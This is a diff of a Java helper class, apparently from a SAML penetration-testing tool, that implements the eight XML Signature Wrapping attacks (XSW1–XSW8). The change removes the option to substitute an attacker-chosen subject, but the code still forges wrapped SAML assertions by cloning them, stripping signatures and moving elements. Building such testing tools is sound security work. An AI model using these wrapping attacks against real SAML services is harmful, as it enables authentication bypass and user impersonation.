@@ -22,40 +22,36 @@ public class XSWHelpers {
 	public void applyXSW(String xswType, Document document){
 		switch (xswType){
 			case "XSW1":
-				applyXSW1(document, evilSubject);
+				applyXSW1(document);
 				break;
 			case "XSW2":
-				applyXSW2(document, evilSubject);
+				applyXSW2(document);
 				break;
 			case "XSW3":
-				applyXSW3(document, evilSubject);
+				applyXSW3(document);
 				break;
 			case "XSW4":
-				applyXSW4(document, evilSubject);
+				applyXSW4(document);
 				break;
 			case "XSW5":
-				applyXSW5(document, evilSubject);
+				applyXSW5(document);
 				break;
 			case "XSW6":
-				applyXSW6(document, evilSubject);
+				applyXSW6(document);
 				break;
 			case "XSW7":
-				applyXSW7(document, evilSubject);
+				applyXSW7(document);
 				break;
 			case "XSW8":
-				applyXSW8(document, evilSubject);
+				applyXSW8(document);
 				break;
 		}
 	}
 	
 	
-	public void applyXSW1(Document document, String evilSubject){
+	public void applyXSW1(Document document){
 		Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
 		Element clonedResponse = (Element) response.cloneNode(true);
-		Element evilAssertion = (Element) response.getElementsByTagNameNS("*", "Assertion").item(0);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
 		clonedResponse.removeChild(clonedSignature);
 		Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
@@ -63,90 +59,68 @@ public class XSWHelpers {
 		response.setAttribute("ID", "_evil_response_ID");
 	}
 	
-	public void applyXSW2(Document document, String evilSubject){
+	public void applyXSW2(Document document){
 		Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
-		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element clonedResponse = (Element) response.cloneNode(true);
 		Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
 		clonedResponse.removeChild(clonedSignature);
 		Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
 		response.insertBefore(clonedResponse, signature);
 		response.setAttribute("ID", "_evil_response_ID");
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 	}
 	
-	public void applyXSW3(Document document, String evilSubject){
+	public void applyXSW3(Document document){
 		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element evilAssertion = (Element) assertion.cloneNode(true);
 		Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
 		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
 		evilAssertion.removeChild(copiedSignature);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		document.getDocumentElement().insertBefore(evilAssertion, assertion);
 	}
 	
-	public void applyXSW4(Document document, String evilSubject){
+	public void applyXSW4(Document document){
 		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element evilAssertion = (Element) assertion.cloneNode(true);
 		Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
 		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
 		evilAssertion.removeChild(copiedSignature);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		document.getDocumentElement().appendChild(evilAssertion);
 		evilAssertion.appendChild(assertion);
 	}
 	
-	public void applyXSW5(Document document, String evilSubject){
+	public void applyXSW5(Document document){
 		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element assertion = (Element) evilAssertion.cloneNode(true);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
 		assertion.removeChild(copiedSignature);
 		document.getDocumentElement().appendChild(assertion);
 		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
 	}
 	
-	public void applyXSW6(Document document, String evilSubject){
+	public void applyXSW6(Document document){
 		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
 		Element assertion = (Element) evilAssertion.cloneNode(true);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
 		assertion.removeChild(copiedSignature);
 		originalSignature.appendChild(assertion);
 		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
 	}
 
-	public void applyXSW7(Document document, String evilSubject){
+	public void applyXSW7(Document document){
 		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element extensions = document.createElement("Extensions");
 		document.getDocumentElement().insertBefore(extensions, assertion);
 		Element evilAssertion = (Element) assertion.cloneNode(true);
 		Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
 		evilAssertion.removeChild(copiedSignature);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		extensions.appendChild(evilAssertion);
 	}
 	
-	public void applyXSW8(Document document, String evilSubject){
+	public void applyXSW8(Document document){
 		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
 		Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
 		Element assertion = (Element) evilAssertion.cloneNode(true);
-		if(evilSubject != null && !"".equals(evilSubject.trim())) {
-			evilAssertion.getElementsByTagNameNS("*", "NameID").item(0).setTextContent(evilSubject);
-		}
 		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
 		assertion.removeChild(copiedSignature);
 		Element object = document.createElement("Object");
